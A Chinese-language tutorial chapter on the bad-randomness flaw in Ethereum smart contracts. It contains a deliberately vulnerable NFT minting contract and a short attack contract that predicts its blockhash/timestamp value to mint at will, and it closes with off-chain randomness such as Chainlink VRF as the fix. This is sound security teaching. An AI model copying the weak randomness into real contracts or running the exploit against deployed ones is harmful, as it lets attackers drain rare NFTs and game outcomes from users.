# 7. 坏随机数

介绍智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。

## 伪随机数

很多以太坊上的应用都需要用到随机数，例如NFT随机抽取tokenId、抽盲盒、gamefi战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（`public`）且确定性（`deterministic`）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如`random()`。很多项目方不得不使用链上的伪随机数生成方法，例如 `blockhash()` 和 `keccak256()` 方法。

坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有NFT而非随机抽取。

## 坏随机数案例

下面我们学习一个有坏随机数漏洞的 NFT 合约：

```js
contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", ""){}

    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```

它有一个主要的铸造函数 `luckyMint()`，用户调用时输入一个 `0-99` 的数字，如果和链上生成的伪随机数 `randomNumber` 相等，即可铸造幸运 NFT。伪随机数使用 `blockhash` 和 `block.timestamp` 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。

下面我们写个攻击合约：

```js
contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}
```

攻击函数 `attackMint()`中的参数为 `BadRandomness`合约地址。在其中，我们计算了随机数 `luckyNumber`，然后将它作为参数输入到 `luckyMint()` 函数完成攻击。由于`attackMint()`和`luckyMint()`将在同一个区块中调用，`blockhash`和`block.timestamp`是相同的，利用他们生成的随机数也相同。

## 预防方法

我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。
